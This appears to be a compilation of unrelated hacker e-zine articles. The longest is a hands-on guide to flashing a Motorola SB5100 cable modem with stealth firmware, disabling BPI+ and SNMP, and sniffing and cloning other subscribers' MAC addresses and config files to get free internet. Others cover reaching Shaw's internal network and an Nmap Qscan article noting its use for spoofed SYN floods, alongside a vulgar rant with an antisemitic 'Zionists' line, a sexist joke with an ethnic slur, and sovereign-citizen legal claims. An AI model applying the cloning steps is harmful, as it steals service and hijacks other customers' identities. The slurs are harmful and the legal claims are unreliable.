Now this isn't your parents cable modem from back in 1996. These modems are more
sophisticated and harder to modify. Uncappers stick out like a sore-thumb if the
administrator(s) of the ISP know what to look for. So, yes you can be caught
and quite easily I might add. It doesn't matter how much you uncap whether it's
1Mbit/s or 10Mbit/s higher then what you pay for, it's inevitable you -WILL- be
caught.

Time for a flash back, I remember back in 1996 when my ISP first announced their 
cable modem internet service. At that point in my life, I was just a kid working
on an ancient laptop. Using "free" dialup accounts, so I begged and begged my 
father to get a cable connection. Once the ISP technician came and installed this
beige Motorola CyberSURFR. that was designed for 10Mbit/s download and 768Kbit/s
upload and I think I was only allowed to use something like 512Kbit/s download
and 128Kbit/s upload. Before I was even on IRC to brag about my new connection 
I was already looking for a way to get more for my money.

Being young, (and before popular search engines like Google) all my searches 
came up empty handed. Soon after I decided to end my quest for more information 
on getting better speeds from my modem, my ISP upgraded all accounts to 1Mbit/s 
down and 512Kbit/s, now this really took my attention away from getting higher 
speeds because at the time 1Mbit/s on downloads were BLAZING fast for me and
others.

Back to the present day, we have cable connections, DSL connections and all 
sorts of connections available to us as consumers now with way higher speeds 
then the "luxurious" connections of the past. I've been with my current ISP for
approximately 10 - 11 years; we got the service as soon as it became available
in the area. I've gone from having 512Kbit/s download speed to having 10Mbit/s 
download speed, but still with increasing interconnectivity and online real-time
games. Faster connections have become in demand.
 
I've tinkered with wireless router firmware modification and such over the past 
few years, then one day I was talking in this IRC channel and this guy from the
US is talking about cable modem modification, so I think to myself "wow, I rem-
ember trying to do something along these lines way back when I first got my cable 
connection". With my recent interest in hardware hacking or hardware modification
as I like to call it. (I don't take warming to the term "hacking" because it has
been so misused by mainstream media it gives curious people a bad name) I decided
to spark up a conversation with him, I ended finding out information that I knew 
nothing about previously.

This is where my quest begins, and I will bring you along for the journey to cable 
modem modification. After reading up on specifications of compatible modems and my
ISP specifications I decided on purchasing a Motorola Surfboard SB5100. As soon as 
I received this modem in the mail, I ripped open the box and instantly took it ap-
art; the tool you'll need to take apart this modem is a #10 torx bit. The torx
screw will be located on the back of the modem at the top. Before you decide to
tear open the plastic casing the sticker with all the information on the bottom of
the stand has to be removed. There are clips under the sticker, press those in and
pull apart the back half of the modem casing. (Note: the modem case doesn't open up
ALL the way so you'll have to remove the board from the back without opening the
case totally up). 

Once you have the main board out of the modem case, find the group of 10 holes (2x5). 
This grouping of holes is where we will either solder the wires too or a 10 pin IDC 
connector. I'm not going to take you through good soldering practice, because I hope 
you're at least smart enough to know how to do something on your own (hopefully lol).

If place the modem so the metal back plate is away from you, you'll have 2 columns
and 5 rows, the column of 5 holes (or pins if you soldered on the 10 pin IDC)

Now for making the JTAG cable, what you'll need are, 2x5 DIL IDC Socket, Flat IDC
cable 20 way (you'll be separating it to 2 - 10 ways), D-SUB 25 Way Plug (LPT for
laymans) and a 25W D-Type Hood. Mostly all of these products are available from
your local RadioCrap or any electronics part store. First you will take the flat
IDC 20 way cable, and a razor, you'll slice VERY carefully down the middle making
2 - 10 way flat IDC cables, next you will clamp on the 2x5 DIL IDC socket.

(Remember! Make sure the pins and the wires from the IDC cable line up!) 

Once you have that its time to make the other side of the cable
(the part that connects to your LPT port) 

Take the razor and split the 10 grouped wires into 10 separate wires, the wires
we will be using will be wire 1, 2, 4, 6, 8 and 10 (counting from the marked
side, its usually marked with red on a grey ribbon) 

We won't be using wire 3, 5, 7, or 9 so you can cut them shorter than the ones
we are going to be using. 

Let's take care of the ground, take wire #1 (red mark) and make a bridge on the
D-SUB 25 way plug on pins 22, 23, 24, and 25. Next go on to Wire 2 to Pin 9,
Wire 4 to Pin 7, Wire 6 to Pin 11, Wire 8 to Pin 8, and Wire 10 to Pin 6. (See
Diagram #1)

----End of Diagram #1------

After we have the JTAG all soldered and ready to be used its time to connect it
to our modem (I'll provide an example picture on how the cable should be facing) 

Once the JTAG cable is connected to the modem and your computer, fire up Schwar-
tze Katze (aka BlackCat) If your cable works perfectly you'll get a message in
the Black Cat Console area saying: 

Manufacturer: broadcom
Part: bcm3348

If it doesn't confirm this, then re-check everything (if necessary, make a new
cable or rebuild the current cable). If you get it, then follow these steps,
remember you'll want to back up all flashes and memory before you flash (in case
you fuck something up).
 
So go into the Flash tab, click Detect then choose Read All. You will want to
select a place for the backup to go (remember where you put it in case you fuck
shit up, haha).

After is has finished backing up, lets now write a new flash :) click on Write
All and choose the flash binary named in the following directory

.C:\Program Files\TCNiSO\SB5100 Bios\SB5100_NOSH.BIN.

Flashing the BIOS will take approximately 30 - 40 minutes, but you can also set
up the processor priority on your processor by task manager to speed up this
process. You'll want to probably get a drink or something to snack on while you
wait for the flash to finish. 

After the BIOS flash is finished, head on over to the SB5100 tab, this is where 
we'll select the firmware that we'll use to allow us to clone another person's
modem. 

The firmware you'll want to use is the modified firmware created by FERSCA, the
release you'll want will be SB5100 Stealth Edition build 13.5 (most current at
the time of the article).

Under the SB5100 tab, click Program and chose the sb5100.stealth.edition.b13.5.
bin after the firmware is all loaded up, now its time to upload the new boot
loader binary. Under the Bootloader options, you'll want to select SIGMAX-BL_v
2.6-LITE.bin from the same archive you got the firmware from. Then click Flash.
 
After this is done you're ALMOST there to having a FREE connection!

Now that everything hardware wise is done it's time to connect to the modem di-
rectly to your machine to set it up, remember DON'T hook up the coaxial cable
yet. Some steps may vary for different ISP so check out surfboardhacker.net if
the following don't work. 

First we need to enable Telnet on the modem, you can do this by going to the
modem's page @ http://192.168.100.1:1337 and clicking on Enable on the telnet,
for this clear the username and passwords fields and apply the settings, now
open up Windows command prompt or PuTTY and telnet into 192.168.100.1, you'll
see a CRAP load of text flying by, this is the modem looking for the down si-
gnal, to stop this from showing do the following commands:

cd docsis
scan_stop


Now that the scrolling has stopped its time to start configuring the modem,
let's start by disabling BPI+ (Baseline Privacy Interface) and we do this by
using the following commands:

cd non-vol 
cd docsis 
enable bpi false 
bpi_version 0 
enable bpi true 
write
cd ..


Now for safety measures lets put the modem into stealth mode (so they can't
look up what MACs are behind the modem to compare against other IPs to see
who is cloning)

cd snmp
hide_ipstack_ifentries true
write
yes
cd ..
cd ..


After all this, you'll want to turn off the SNMP filters so you can sniff
MACs from your node (It is best to do it from another node so you can use
those MACs @ home)

cd snmp
filters off
yes
write
yes
cd ..


Now it's time to turn off the snmp responses

shell
td tSnmpd
exit
logout


Now at this point you are now able to sniff cable modem configuration files
and HFC MAC addresses to use on your modem. Once you've found some HFC MACs
or modem configuration files (depending what ISP you have) all you have to
do is go into http://192.168.100.1:1337/ and input the information in there
and VIOLA! You know have free highspeed Internet access!

A Guide to Shaw's Internal Network

	- By fr0st -

Those who want to reach me know were to find me.
 
# NOTE ####################################################################
# Shaw has recently upgraded their systems and this will only work on the #
# older Shaw network and will no longer be applicable to the new network. #
###########################################################################

First off connect your modem and let it go online as normal. Telnet in 
and let's disable the filters, disable snmp responses, put our modem into
stealth mode and grab the information we will use later in this tutorial.
First we turn off the filters.

cd snmp
filters off
yes
write
yes
cd ..

then lets put the modem into stealth mode.

cd non-vol
cd snmp
hide_ipstack_ifentries true
write
yes
cd ..
cd ..

now lets turn off the snmp responses.

shell
td tSnmpd
exit

Now that we are back into the regular shell, lets grab out IP information
we will be using to get onto the internal network later. use these commands
and then copy the results into a blank txt file using notepad or your
choice of text editors.

cd docsis_ctl
ip_show

Once we have this all copied to our text editor we can now log off

logout

Now let's open up a cmd window (Start -->> Run ->> cmd *enter*)
we are going to grab our current WAN information.

ipconfig /all

find the information that has your current IP, DNS servers, gateway and 
netmask, then copy that into another txt file.

once we have all this information and ready to use lets go into our 
network settings.

On Windows XP, 
Start --> Control Panel --> Network Connections --> (right click on the 
interface you are currently using and go to properties) --> (scroll down 
in the box until you see "Internet Protocol (TCP/IP)" then click 
"Properties" --> click the option to Use the following IP address, (this 
is where you enter the 10.* information you got from the modem)

After entering that info, click "Advanced..." then under IP Addresses 
click "Add..." then add the information of the current IP and gatway you 
have on the regular WAN (info from ipconfig /all)

Now under Default Gateways: click "Add..." and then put the gateway IP 
we obtained from ipconfig earlier.

The results should look something like this:


Now close all the network connection windows by going to each one and 
clicking "OK"

after all this open up a cmd window and type in 

route -p add 10.0.0.0 mask 255.0.0.0 10.x.x.x

where 10.x.x.x is the internal gateway ip you obtained from the modem 
earlier in this tutorial.

Now open up 2 more cmd windows and in one type

ping -t tftpip 

(tftp ip would be what we got the from modem a 10.* ip)

and in the other window type

tracert tftpip

If both of these work, then you should be able to use Mark's
Config Scanner.

Have fun.

Greetz to everyone in #surfboard_hacker

and big ups to Mark for the killer config scanner. gj bro.

	Why The Cash Store can suck my cock, respectfully.

Introduction:

In today's cashless society we're constantly being bombarded with t.v.
advertisments for fixed rate mortgages, we receive spam e-mails and snail
mail in our mailboxes offering us 4.5% interest Capital One Credit Cards,
4.25% interest accumulating RRSP offers from the likes of ING Direct. Our
banks or "financial institutions" will often times call us unexpectedly 
and at the worst possible times offering us overdraft protection and lines
of credit. The only thing you need to do is sign the dotted line and sudd-
enly you've entered into a world of possibilities. A world of fancy clothes,
of fast cars, the latest computer gear, the very finest Italian wines from
world's famous producers in the forefront of enology - surely the lavish
lifestyle that we all want to have, or at least pretend to have.

And all we have to do is sell our souls. The things we buy with our newly
allowed credit from our masters and theirs (*cough* The World Bank *cough*)
is now conveniently data mined, sold, re-sold, and re-sold again. Gee I
guess you forgot to uncheck that little box on the bottom of that offer
or when that banking representative spewed out the terms and conditions
of your loan, overdraft, or line of credit, you hummed and hawed. Waiting.
Tuning her out. Anticipating the end so she could finally say those five
delightful words to you: congratulations  we  are  all  finished.

In other words, you're now their bitch so you better damn well play with
your credit. Buy your irrelevant things, show it off to your friends and
family, continue to live a meaningless and existence of materialism.
All the while (usually unknowingly) continuing to let the money masters
make billions and trillions off of your back and the backs of other naive
"global citizens".

There are some people who have seen the damage that credit can do to your
life if you let it get out of control. They've felt the long term sting
of debt that has spiralled so out of control that the person responsible
for this debt feels helpless, they feel an undescrible amount of shame,
and fear for the unknown - "what is going to happen tomorrow? Are they
going to garnish my wages, reposess my car, put a foreclosure on my home?"

Sure, on surface it would appear these people have no one to blame but
themselves. But perhaps they lost their job, had a terrible tragedy in
their life or had a recent divorce and they simply couldn't keep up.

On the other hand there are people who have seen the stress bank accounts,
debit cards, credit cards, and this whole tangled mess the financial world
can put on a person. They perhaps got in a little bit of debt, got them-
selves out and realized in the end that they were sick of paying debit
card fees. Sick of being tempted to buy unnecessary things with piece of
plastic. Putting material things on the overdraft and living beyond their
means. I for one was this type of person and I wasn't going to take it
anymore.

It wasn't until after paying down my credit cards to zero and cancelling
them, paying off my overdraft and cancelling that, and finally closing my
CIBC (Canadian Imperial Bank of Commerce) bank account did I feel this
complete sense of freedom. Now I could work for a living, physically
handle my money, pay bills with the exact change without having to const-
antly think in the back of my mind "gee, I wonder if I have enough to
cover the debit fees I'll endure with this transaction?". I'll tell you
something it was enough to drive anyone crazy, and believe me I was on
the brink of insanity. I was ready to call up Alberta Hospital and tell
them to come get me, tie me up with a straight-jacket and use their
big rubber stamp with the words "INSANE" as graffiti on my forehead.

So I'm free, now what? With the extra money I have saved that would have
otherwise gone into the pockets of the money hungry, I put my extra moola
towards investments that are not affected by inflation deflation, or an
economic crisis: silver and gold. Remember that in our uncertain world in
the 21st century, the whims and fancy of a select few (World Bank Zionists)
can quickly alter the economic security, stability and order we have come
to expect and take for granted in our society. In the end, it is the resp-
onsibility of each of us, individually, to be prepared for change.

I would love to go on a big explanation about how gold, silver, platinum,
platinum, palladium and other precious metals are the only true currency,
but that would overshadow the real reason why I wrote this particular
article. If you want to learn more about what I'd rather not discuss, go

Back to the topic at hand...

Alright so I've gotten rid of the credit card debt, overdraft, and the
bank account, and I'm putting my increasingly worthless money, or "debt
notes" towards some useful: liquid asset investments. Now what? Well bet-
ween closing my accounts, cutting up my plastic and securing my wealth
with metals, I needed to cash my work cheque.

Easy right? You go to Money Mart and they charge you a 3% interest + tax.
Sure and on any given day if I needed some quick money and I say had a
GST Cheque or a personal cheque and I needed the cash fast, I'd use this
fine establishment -- yes I said fine establishment. Trust me, you'll be
agreeing with me shortly when you read what unkind words I have to say
about the scum bags that operate The Cash Store and their subsiduaries.


This is how it all began:

It was Friday - Payday. A couple of buddies and I were planning on
heading over to a friend's place for a few drinks, some snacks, maybe
a hoot of the reefer, who knows - maybe all of the above. Look it was
Friday and the end of a relatively stressful day; and well, every man
has his vice so BACK OFF and STOP JUDGING ME, bitch!

Now, where were we? Right:

So my one buddy, "Fred" tells me we could hit up a Money Mart or some
other convenient cheque cashing store and see about getting me my hard
earned money. I suggested we could hit up a nearby Cash Store since it
was convenient. So we pull up to The Cash Store, and walk in...


Cash Store employee #1 says: "Hi how can I help you today?

Me: "Why yes, I would like to cash my cheque today please."

Cash Store employee #1 says: "We're going to need to see the cheque,
and two pieces of Government issued ID. And we're also going to need
you to fill this out..."

And she hands me this very empty piece of paper that lists the usual
things:

First Name:
Last Name:
Date of Birth:
Home Address:
Telephone #:

Company Name:
Company Address:
Company Telephone #:

etc, etc.


Then I get to the part that really pissed me off. The part that really
ground my proverbial axe. It asked for my height, weight, nationality,
and Social Insurance Number. "Wow" I thought to myself, "This seems a
little bit unnecessary if you ask me..."

And before I even had a chance to pipe up and argue why I thought the
piece of paper they handed me was a gross invasion of privacy, Cash
Store employee #2 speaks up and says in a really nervous yet bitchy
voice (you know the kind you'd hear spewing out of a 400 pound trailer
trash bitch who looks like she popped out about two dozen too many):


"Yeah so here's how it all works at The Cash Store. We don't actually
give you cash."

I look back at my pals with sheer amazement and then back at The Cash
Store Employee #2, and respond "Uhhh what? No cash? At The Cash Store?"

"No, you see, we actually require you to purchase a Cash Store Debit
Card from us for $12.00. And then we take the cheque, charge you a 3%
interest fee, and a top up fee to add the money to the debit card."

"Wow. And then I'm charged a fee to use the debit card at an ATM from
either the bank or the third party company running the bank machine.
And furthermore I bet I'm being charged a fee from The Cash Store to
use it too right?"

And out from behind me "Fred" screams, "What a rip off! They're ripping
you off man! Let's get the hell out of here!"

"Yeah, this doesn't seem right," expresses my other buddy Jack.

The Cash Store Employee #1 retorts with an ever-so-smug look on her
face, "Yes, we charge these fees and this is our company's policy."

The Cash Store Employee #2 replies to her and I "Yes, and if you aren't
happy with this policy, you can always try a Money Mart or something..."
This time both employees are becoming increasingly uncomfortable with
our sheer unwillingness to be duped into blindly going along with this
horse shit.

So I reply, "Look, this is ridiculous. You're charging me a fee to get a
card, an interest fee on the cheque, a fee to add funds to the card. And
on top of this I'm charged a fee from the bank to get my own money out
of the machine and then a fee from you guys! And look at this..."

I point to the document they wanted me to sign "You want me to put my
Social Insurance Number down as well? This isn't right! The only people
by law that I have to disclose this to is Revenue Canada and my employer!"

The Cash Store Employee #2 replies, "Yes. We require it because the
computer won't let us go further unless we enter a valid Social 
Insurance Number. And by law it must be yours."

Knowing damn well that this was bullshit, and that it was highly unlikely
that their shitty-assed Cash Store software application would actually
have a way of checking validity of the Social Insurance Number. I even
doubted the software application used the LUHN algorithm (a.k.a. mod-10).

*** Note: I actually verified this with a friend and former employee of
The Cash Store subsiduary, InstaLoans, who worked in the head office &
she confirmed that the SIN isn't necessary & it can actually be skipped,
or voided by entering all zeros. And furthermore that by law all The Cash
Store requires is two pieces of ID, one of them being Government Picture 
ID. Hah, I told you! ***


At any rate "Fred" and "Jack" look at me shake their heads, looked at the
two stupid Cash Store employees and shook their heads with an added touch
of disgust that one can only imagine having after witnessing such bullshit.

I grab my cheque, my IDs, the piece of paper I partially filled out and we
all walk out and head over to "Bob"'s for drinks, reefer, and good ol fas-
hion hate talk against piece of shit companies like The Cash Store.


In conclusion:

I ended up going to Money Mart to cash my cheque.

Alternatives if you don't have a bank account:


- Money Mart. They don't ask questions, they give you your cold hard 
cash, and sometimes they even do it with an insincere smile behind the
2 feet of bullet proof glass. All while under the watchful eye of a
few low-quality web-cams and two other security cameras. Hey, I've seen
some of the idiots that go into those places: homeless people, drug
addicts with forged cheques, bottom of the barrell labourers that are
trying to avoid paying child support, and well, people like me. ;-)


- O.J's Cheque Cashing. This rough-around-the-edges woman, who looks
like she spent way too many years in a down-and-out trailer park, will
cash your cheque as long as you present her with one piece of photo id,
a birth certificate or a SIN Card (please, for crying out loud don't
ever be stupid enough to give that out to anyone besides your employer
and Revenue Canada). She also requires that you pay her a one-time $5.00
membership fee, and fill out a simple form with your weight, and height.
Hey, it might sound slightly Orwellian but this woman isn't tracking
your every purchase like your bank was, so suck it up buttercup.

                "Bring your mother, and bring your sister too
                  I'm a clit licker, and I wanna lick you!"

                  -- G. G. Allin, Clit Licker, E.M.F, 1983

You may not be aware of this, but the BlackBerry Pearl is very much like a
woman. It's nice to look at and can be used "hands-free", but it also demands
constant attention. And it interrupts you. And it's expensive.

But there's another striking similarity, one which you likely overlooked on
your phone just as you would have overlooked it on a woman were you ever to
get one in your parents basement naked...

This phone has a clit.

What does this phone-clit do? Well, you have to spend a lot of time rubbing
it up and down and back and forth and twiddling it around if you want your
phone to do what you want it to. (Sound familiar?) But just like a real clit,
no matter how much attention you give it, it really doesn't give anything
back. That is until now...

You can make that clit light up like a jewish christmas tree on chinese new
year. Just do like this...

Now every incoming call is like a disco in your pants as your clit pulses

The hunnies tight little smurf-panties will be moist with pleasure and
excitement after observing your mad phone-clit manipulation skills.

              Firewall Discovery and Network Research
                        with the Nmap Qscan

                                by
                     Doug Hoyte and HCSW Labs

Nmap [4] is already the standard tool in mapping firewall configurations.
The ACK/Window scans, -f for IP fragmentation, FTP/Proxy scanning,
Ed3f's --bad-checksum option, -g for custom source port values - all
contribute in making Nmap the most comprehensive firewall discovery and
mapping tool in existance.

Last year at a conference I attended, CanSecWest [6], I rubbed shoulders with
numerous security professionals and had several discussions involving mapping
firewall configurations. I remember talk about two valuable types of firewall
mapping tests that neither Nmap nor any other tool was completely able to
perform.

1) Firewall Time To Live (TTL) discrepancies.

The standard traceroute concept. Note that since TTL is an IP layer
attribute this test can be applied to any Internet Protocol: TCP, UDP, ICMP,
IGMP, what have you.

In theory, firewalls that decrement the TTL field of the IP header when
forwarding a packet are easy to detect. If, with a certain packet format,
a target is tracerouted to be n hops away but n-1 hops away by a different
one, then we can infer the n-1th hop is applying some sort of packet filter.

Although this technique is well understood, the tools to perform and
analyse these metrics are somewhat lacking. There's Mike Schiffman's
venerable firewalk program [2], but it lacks query and rDNS parallelisation
making it too slow to be practical in many cases. There's custom hping,
(my as yet unreleased) nuff, scapy, etc scripts/commands but these often
lack the standardisation, convenience, and reliable interpretation of results
that Nmap is famous for.

One of the items on the Summer Of Code (SoC) agenda is to design and code
a traceroute mapping utility of exactly this sort. SoC participant
Eddie Bell has been working hard to bring you this mapping functionality in
the near future and, perhaps by the time you've read this, will already be
available as a patch for Nmap.

The biggest downside to this sort of measurement is that it is easy to
set up packet filters that don't decrement the TTL value of packets.

2) Round-Trip Time (RTT) discrepancies.

Transmitting packets over the network takes time. No matter how you structure
your networks, network latency is a factor. Transmitting a packet over
ethernet, ISDN, wifi, pigeon, etc, inevitably results in a statistically
detectable packet transmission delay.

In theory, if packets of a certain format are replied to after t, say,
milliseconds, and packets of a different format are replied to in t+delta
milliseconds, we can infer the existance of some sort of filtering or
forwarding delay of delta milliseconds.

On that note, we are pleased to introduce...



The Nmap Qscan
~~~~~~~~~~~~~~

We have designed a new Nmap scan type, tentatively named Qscan, which
tries to measure these differences within a consistent statistical context.

Although Qscan makes use of Nmap's powerful port and host specification
features, it isn't like other Nmap scans - It doesn't try to determine the
states of ports. Instead, Qscan provides a method for carefuly measuring
packet round-trip times and applying powerful statistics to the results.

Qscan endeavours to provide a way of sending probes, measuring their res-
ponses, and interpreting the inevitable delay between network hops. To make
this as useful as possible, we have decided to embed Qscan into Nmap in
order to make use of Nmap's extensive packet creation/transmission/capture
functionality and to allow the user to specify hosts/ports in the conveni-
ent, familiar Nmap command line style (and, perhaps eventually, through
sophisticated Nmap GUIs like UMIT).



So how, exactly, does Qscan work?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Qscan depends on a very simple model of network behaviour:

o Due to queuing delays and inherent network latency, packet round trip
  times are assumed to conform to a truncated normal distribution.
  See [2] for empirical evidence as well as an explanation involving
  the application of the Central Limit Theorum to packet arrival times.

o A target TCP is assumed to respond to SYN packet requests as soon as
  it can and no sooner. In other words, nobody is trying to trick us by
  maliciously delaying packets or replying to packets they haven't yet
  received.

Our algorithm is simple:

We cycle through the list of specified port/host combinations sequentially.
For instance, if a user specifies:

  nmap -sQ -p 22,80 192.168.0.1 192.168.0.2

We will alternate transmission between the following 4 packet host/port
designations (we'll just call them "targets" from now on):
  192.168.0.1:22
  192.168.0.1:80
  192.168.0.2:22
  192.168.0.2:80

Qscan waits a random interval between each transmission in order to
avoid the periodic, self-similar round-trip time delay biases described
in [2]. The user of Qscan is able to customise the average delay. With an
average delay set to N milliseconds, Qscan will select delays from the
uniformly distributed range of 0.5N to 1.5N.

Qscan listens for replies to queries it sent and measures, to the
best of its ability, the exact round-trip time for each target.
The first round of transmissions are not included in the statistics
to avoid initial NAT and routing table lookup delays.

Qscan works against ports that are open and ports that are closed.
In the case of filtered ports, since we don't necessarily get a response back
from the target TCP, Qscan does not work. If you scan filtered ports
Qscan will display a packet loss of 100% and will be unable to classify
the port.

Once Qscan has collected a certain number of round-trip time
measurements (another user customisable parameter) for each target,
it finishes and attempts to statistically analyse the data.

Qscan uses a dual-tailed, independent-group Student's t-test to estimate
the probability that 2 sequences of packets with different measured means
and standard deviations are, in fact, different.

Wikipedia has a lengthy treatment of the subject [3]:

 "In probability and statistics, the t-distribution or Student's
  t-distribution is a probability distribution that arises in the problem
  of estimating the mean of a normally distributed population when the sample
  size is small. It is the basis of the popular Student's t-tests for the
  statistical significance of the difference between two sample means, and
  for confidence intervals for the difference between two population means."

By comparing our samples (the measured RTTs for each packet host/port
combination) using the t-test we can estimate the liklihood that there
is an actual difference in packet traversal times rather than simple
random fluctuations. Yet another Qscan parameter indicates the confidence
level we require in order to state that, yes, there was a statistically
signifigant difference between these 2 packet delivery times. This parameter
is called the confidence level and, by default, is set to 0.95, representing
a confidence level of 95%.

When reporting the results, Qscan uses the t-test to try grouping targets
together into "families". Each family is considered to, statistically, have
the same round-trip response time.



The Qscan Options
~~~~~~~~~~~~~~~~~

--qscan-delay <integer number of milliseconds>

  Specifies the average delay between packets sent. Qscan waits between
  0.5N and 1.5N between transmissions. Defaults to 200.

--qscan-numtrips <integer number of round trips to record>

  Specifies the minimum number of round trips for Qscan to record before
  terminating. Defaults to 10.

--qscan-confidence <floating point confidence level>

  Specifies the "confidence" parameter to the Qscan. Must be a value
  on the range 0.0 < N < 1.0. The higher the value the more obvious
  the differences in round trip times will have to be for Qscan to
  differentiate ports into different families. Currently the only
  confidence levels supported are 0.75, 0.9, 0.95, 0.975, 0.99, 0.995,
  and 0.9995 though we might support more values in the future through
  interpolation. Defaults to 0.95.



OK, enough theory, how do I use it?
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


(These examples have been partially edited for clarity and brevity)

Example #1)

Let's try measuring the round trip times to 2 ports on my wireless
router. Port 80 is open and port 23 is closed.

# ./nmap -sQ -p 23,80 192.168.0.1

Starting Nmap ( http://www.insecure.org/nmap/ )
Qscan parameters: round trips: 10, avg delay = 200ms, confidence = 0.95
         Target:Port  Fam  uRTT  +/- Stddev  Loss%
    192.168.0.1:23    A     3.1  +/-   0.2     0
    192.168.0.1:80    A     3.2  +/-   0.1     0

Nmap finished: 1 IP address (1 host up) scanned in 9.905 seconds


It isn't too suprising that these 2 ports seem to have the same round-trip
times. After all, they're handled by the same piece of hardware on the same
interface. Notice how they've both been grouped into the family 'A'.



Example #2)

In the event that you scan a port that is filtered, Qscan should handle
it gracefuly. In this case, my DSL's outbound port 25 is filtered:

# ./nmap -sQ -p 23,25,80 hcsw.org

Starting Nmap ( http://www.insecure.org/nmap/ )
Qscan parameters: round trips: 10, avg delay = 200ms, confidence = 0.95
         Target:Port  Fam  uRTT  +/- Stddev  Loss%
  65.98.116.106:23    A    79.6  +/-   0.7     0
  65.98.116.106:25    ?     N/A  +/-   N/A   100
  65.98.116.106:80    A    84.8  +/-  12.7     0

Nmap finished: 1 IP address (1 host up) scanned in 14.594 seconds



Example #3)

OK, that's all fun and interesting, but I thought we could use Qscan
to detect firewalls?!

We can! I've set up a router with the IP address 192.168.1.254 to
forward packets on port 8080 to an internal machine, but the router
handles packets on other ports itself. Here's the resulting Qscan:

# ./nmap -sQ -p 23,25,80,8080,9876 192.168.1.254

Starting Nmap ( http://www.insecure.org/nmap/ )
Qscan parameters: round trips: 10, avg delay = 200ms, confidence = 0.95
         Target:Port  Fam  uRTT  +/- Stddev  Loss%
  192.168.1.254:23    A     3.1  +/-   0.1     0
  192.168.1.254:25    A     3.1  +/-   0.2     0
  192.168.1.254:80    A     3.2  +/-   0.1     0
  192.168.1.254:8080  B     4.6  +/-   0.3     0
  192.168.1.254:9876  A     3.1  +/-   0.2     0

Nmap finished: 1 IP address (1 host up) scanned in 22.886 seconds

Qscan easily discovers this and, appropriatley, groups them into separate
families - 'A' representing the ports handled by the router (firewalled)
and 'B' the ports passed through to the internal machine.

Of course this is on a low-latency, low-variance local network which makes
it easy to measure these differences even with few packets over a short
period of time. If you are trying to discover this information over a high
variance network like the general internet, it is likely that the Qscan
parameters will need to be tuned. With enough data, verified enough times
from enough network locations, it should be possible to discover almost
any round-trip time discrepancies.



Example #4)

Qscan has already helped me discover tidbits of network connectivity
information that I previously wasn't aware of. You might know that, when
searching for filtered/firewalled ports, 113 (auth/ident) is often a good
target. Administrators are generally aware of the privacy and performance
problems associated with this port and filter it heavily.

# ./nmap -sQ -p 25,113 smtp1.google.com

Starting Nmap ( http://www.insecure.org/nmap/ )
Qscan parameters: round trips: 10, avg delay = 200ms, confidence = 0.95
         Target:Port  Fam  uRTT  +/- Stddev  Loss%
  216.239.57.25:25    A    76.6  +/-   5.3     0
  216.239.57.25:113   B     2.4  +/-   1.9     0

Nmap finished: 1 IP address (1 host up) scanned in 12.097 seconds

Hold on there! Look at how low the port 113 round-trip times are! After
investigating it we discovered that, on this server, our upstream provider
responds to connection initiations with resets, presumably to speed up
protocols that hang while waiting for responses on this port. (I personally
think it's to annoy people running IRC daemons, but nevermind).



Example #5)

There really are many possible uses for Qscan! Consider search engine
selection.

# ./nmap -P0 -sQ -p 80 google.com yahoo.com live.com ask.com

Starting Nmap ( http://www.insecure.org/nmap/ )
Warning: Hostname google.com resolves to 3 IPs. Using 64.233.187.99.
Warning: Hostname yahoo.com resolves to 2 IPs. Using 66.94.234.13.
Qscan parameters: round trips: 10, avg delay = 200ms, confidence = 0.95
         Target:Port  Fam  uRTT  +/- Stddev  Loss%
  64.233.187.99:80    A    23.2  +/-   6.3     0
   66.94.234.13:80    B    77.3  +/-  10.2     0
 207.68.172.235:80    C    94.8  +/-  14.2     0
   65.214.39.56:80    D     7.4  +/-   0.2     0

Nmap finished: 4 IP addresses (4 hosts up) scanned in 17.574 seconds

Looks like from this particular network location I get the best response
time from ask.com! If I was writing a script that performed web searches
(and ask.com's quality was sufficiently close to google's) I might consider
using ask.com for the fastest possible results.




Notes
~~~~~

o There are many different factors that can influence the results
  reported by Qscan. If the routes that packets follow are changed
  during the Qscan, or the targets are handled by IP-based load
  balancers, or the network connection is especially unreliable, the
  results will obviously be skewed. You are encouraged to experiment
  with and verify any results reported by Qscan.

  Keep in mind that, unlike other Nmap scans that determine the states
  of ports, Qscan is a statistical tool and a certain margin of error
  must be expected and accounted for.

o Remember that the congestion caused by the packets sent by Qscan
  and the replies from the target and the subsequent RSTs sent
  by your operating system (in the case of open ports) can themselves
  cause a fair amount of network congestion and actually impact the
  results of your scan! If this is a concern, using a larger
  --qscan-delay can offset this.

o Using an extremely low --qscan-delay can be dangerous! It is
  possible for Qscan to timeout a probe and send a new probe
  from the same source port. If the response to the original
  probe arrives subsequently, incorrect round trip times can be
  recorded. Qscan is usually smart enough to determine when this is
  a possibilty and will warn you. This should be almost impossible
  with reasonable --qscan-delay values.

o As a side-effect of the underlying design, Qscan can also serve
  as a powerful SYN flood attack tool. By spoofing a fake
  (unresponsive) IP address with the Nmap -S option so your OS
  doesn't reply with RST packets to the victim's SYN|ACK packets
  and finding a --qscan-delay with a reasonably low packet loss,
  a very efficient SYN flood attack can be performed. This is,
  of course, not recommended except for experimentation and
  research purposes. See [5] for an overview of SYN flooding
  attacks.



Future Work
~~~~~~~~~~~

o The algorithm could possibly be improved. Some sort of median
  filter would be helpful in throwing out packets that are
  obviously outliers and not representative of the packet delays.

o A variable rate Qscan could potentially be helpful but invites
  a new set of problems that would have to be dealth with.

o It could be useful to allow people to Qscan with different
  types of probe packets. ACK or SYN|ACK packets instead of
  SYN packets would be obviously useful. Also, UDP and ICMP
  probes are possible.

o Testing and tuning! The default parameters are mostly just
  arbitrary values we picked (except for a confidence level
  of 0.95 which is the gold standard in statistics).
  Experimentation and real-world usage might discover better
  values to use.

o Right now Qscan assumes all targets are reachable through the
  same network interface. This is an unnecessary restriction
  and should be eliminated.

Word Wise

The governments can be very "tricky" in their wording of things. Something to
make yourself aware of and wise to very quickly if you want to gain the upper
hand. Armed with the information here, all American visitors are challenged to
search their own laws and see how much of the data provided here applies to
them in their country - as well as all other western nations. Only by search-
ing out the truth of the laws and your original rights and freedoms yourselves,
will you be empowered to protect your 'natural person' as a human-being.

Here's 4 tricks outlined below:


FIRST TRICK:

The first "trick" of the government is the re-definition of certain critical
words in each Statute(Act). They(the government) want you to assume the ord-
inary meaning of the word so as to trick you into reading and interpreting 
the Statute in their favour. Two key words that are re-defined in almost
every statute are the words "person" and "individual". There are at least
two "person" in law: A 'natural-person' is a man or woman, created by God.
An 'artificial-person' is a corporation, created by Man.

